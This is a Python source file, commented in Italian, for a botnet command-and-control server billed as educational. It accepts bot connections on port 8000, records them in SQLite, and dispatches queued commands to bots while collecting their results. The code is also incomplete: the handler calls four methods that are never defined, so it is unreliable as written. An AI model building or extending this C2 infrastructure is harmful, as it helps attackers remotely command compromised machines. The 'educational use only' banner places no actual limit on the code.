#!/usr/bin/env python3
"""
Server di Command & Control per simulazione botnet didattica
"""

import socketserver
import threading
import json
import hashlib
import logging
from datetime import datetime
import sqlite3

class BotNetC2:
    def __init__(self, host='0.0.0.0', port=8000):
        self.host = host
        self.port = port
        self.connected_bots = {}
        self.setup_database()
        self.setup_logging()
    
    def setup_database(self):
        """Inizializza database per logging attività"""
        self.conn = sqlite3.connect('c2_server.db', check_same_thread=False)
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bot_connections (
                id INTEGER PRIMARY KEY,
                bot_id TEXT,
                ip_address TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                status TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY,
                bot_id TEXT,
                command TEXT,
                timestamp TIMESTAMP,
                status TEXT
            )
        ''')
        self.conn.commit()
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('c2_server.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('C2_Server')

class BotHandler(socketserver.BaseRequestHandler):
    def handle(self):
        bot_ip = self.client_address[0]
        bot_id = hashlib.md5(bot_ip.encode()).hexdigest()[:8]
        
        self.server.botnet.logger.info(f"Nuova connessione da {bot_ip} (ID: {bot_id})")
        
        try:
            # Registra bot nel database
            self.register_bot(bot_id, bot_ip)
            
            # Gestisci comandi
            while True:
                data = self.request.recv(1024).decode('utf-8').strip()
                if not data:
                    break
                
                if data == 'GET_COMMAND':
                    command = self.get_command_for_bot(bot_id)
                    self.request.send(command.encode('utf-8'))
                elif data.startswith('RESULT:'):
                    result = data[7:]
                    self.log_command_result(bot_id, result)
                elif data == 'HEARTBEAT':
                    self.update_bot_status(bot_id)
                    self.request.send(b'ALIVE')
        
        except Exception as e:
            self.server.botnet.logger.error(f"Errore con bot {bot_id}: {str(e)}")
        finally:
            self.server.botnet.logger.info(f"Connessione chiusa con {bot_id}")

def main():
    print("🚀 Avvio Server C2 Didattico")
    print("⚠️  USO ESCLUSIVAMENTE DIDATTICO")
    
    c2 = BotNetC2()
    server = socketserver.ThreadingTCPServer((c2.host, c2.port), BotHandler)
    server.botnet = c2
    
    try:
        print(f"Server C2 in ascolto su {c2.host}:{c2.port}")
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nArresto del server...")
    finally:
        c2.conn.close()

if __name__ == "__main__":
    main()
